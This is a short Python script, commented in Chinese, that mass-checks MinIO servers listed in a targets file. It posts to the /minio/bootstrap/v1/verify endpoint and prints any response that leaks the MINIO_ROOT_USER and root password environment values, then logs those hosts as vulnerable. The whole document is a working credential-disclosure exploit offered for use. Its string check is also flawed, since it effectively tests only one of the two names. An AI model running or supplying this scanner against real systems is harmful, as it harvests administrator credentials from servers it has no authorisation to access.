#code by step 垃圾实现，新建tagets.txt设把MinIO的api端口链接放到tagets.txt中。
#很垃圾的实现就是了

import requests
import json

# 打开保存目标 URL 的文本文件
with open('targets.txt', 'r') as f,open('results.txt', 'w') as f_out:
    # 逐行读取目标 URL 并发送 GET 请求
    for line in f:
        # 删除行末的换行符
        target = line.rstrip('\n')

        # 发送 GET 请求并获取响应
        try: 
            response = requests.post(target+"/minio/bootstrap/v1/verify", data={'key': 'value'},timeout=7)
           
          

            # 判断响应中是否包含特定字符串并输出结果
            if 'MINIO_ROOT_PASSWORD' and 'MINIO_ROOT_USER' in response.text:
                #print(f"Found 'vulnerable' in {target}")
                print(response.text)
                f_out.write(f"Found 'vulnerable' in {target}\n")
            else: 
                print("not vulnerable")
        except requests.exceptions.RequestException as e:
            # 如果连接失败，则打印错误信息并继续到下一个目标
            print(f"Connection error")
            continue
